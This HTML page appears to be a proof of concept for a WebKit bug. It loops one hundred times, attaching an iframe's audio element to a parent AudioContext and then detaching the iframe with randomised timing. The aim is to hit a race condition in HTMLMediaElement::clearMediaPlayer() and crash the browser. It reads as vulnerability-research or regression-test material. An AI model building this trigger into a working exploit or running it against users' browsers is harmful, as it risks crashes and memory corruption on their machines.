<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebAudio Iframe Detach Test</title>
</head>
<body>
    <button id="btn" style="font-size:20px; padding:10px 20px;">Iniciar Teste</button>
    <div id="status" style="margin-top:15px; font-family: monospace;">Aguardando início...</div>

    <script>
    let cycle = 0;
    const maxCycles = 100; // Múltiplos ciclos para aumentar a probabilidade de acertar a race window
    let audioCtx = null;

    async function runCycle() {
        if (cycle++ >= maxCycles) {
            document.getElementById('status').innerText = 'Concluído: ' + maxCycles + ' ciclos sem crash.';
            return;
        }

        document.getElementById('status').innerText = 'Executando ciclo ' + cycle + '/' + maxCycles + '...';

        const frame = document.createElement('iframe');
        frame.src = '07.html';

        frame.onload = async function() {
            try {
                const audio = frame.contentDocument.querySelector('audio');
                if (!audio) return;

                // Conecta o elemento de áudio do iframe ao AudioContext da página pai
                const source = audioCtx.createMediaElementSource(audio);
                source.connect(audioCtx.destination);
                
                await audio.play().catch(() => {});

                // Delay curto para garantir que a Audio Render Thread esteja processando buffers ativamente
                setTimeout(() => {
                    // Remove o iframe abruptamente para disparar HTMLMediaElement::clearMediaPlayer() na main thread
                    frame.remove();
                    
                    // Agenda o próximo ciclo
                    setTimeout(runCycle, 20);
                }, Math.floor(Math.random() * 50) + 10); // Variação de timing para varrer a janela de corrida
            } catch (e) {
                console.error(e);
                setTimeout(runCycle, 20);
            }
        };

        document.body.appendChild(frame);
    }

    document.getElementById('btn').onclick = function() {
        // Inicialização do AudioContext requer interação do usuário (clique) no WebKit
        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
        audioCtx = new AudioContextClass();
        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
        document.getElementById('btn').disabled = true;
        runCycle();
    };
    </script>
</body>
</html>
